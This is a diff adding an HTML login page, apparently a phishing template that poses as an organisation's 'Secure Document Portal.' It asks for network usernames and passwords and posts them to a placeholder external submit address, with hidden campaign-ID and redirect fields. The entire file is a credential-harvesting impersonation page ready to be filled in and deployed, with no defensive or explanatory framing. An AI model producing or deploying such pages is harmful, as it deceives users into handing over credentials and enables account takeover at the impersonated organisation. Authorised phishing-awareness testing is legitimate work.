@@ -1,0 +1,37 @@
+<html>
+
+<head>
+  <link rel="stylesheet" href="style.css">
+  <style>
+    .emblem{
+    /* prevents dragging of image */
+    user-drag: none; 
+    user-select: none;
+    -moz-user-select: none;
+    -webkit-user-drag: none;
+    -webkit-user-select: none;
+    -ms-user-select: none;
+    }
+  </style>
+  <title>{ORG NAME} Secure Document Portal</title>
+  
+</head>
+
+<body>
+  <div class="login-page">
+      <div class="form">
+        <form class="login-form" action="https://{SUBMIT PAGE}">
+          <img src="emblem.png" class="emblem" width="80%">
+          <h2>Secure Document Portal</h2>
+          <h4>To view this document, sign in using your network username and password.</h4>
+          <input style="border:2px solid rgb(4, 14, 99);" type="text" placeholder="Username" name="username"/>
+          <input style="border:2px solid rgb(4, 14, 99);" type="password" placeholder="Password" name="password"/>
+          <input name="project" value="{PROJECT ID}" TYPE="hidden">
+          <input name="redirect" value="{REDIR PAGE}" TYPE="hidden">
+          <button>login</button>
+        </form>
+      </div>
+    </div>
+<body>
+
+</html>
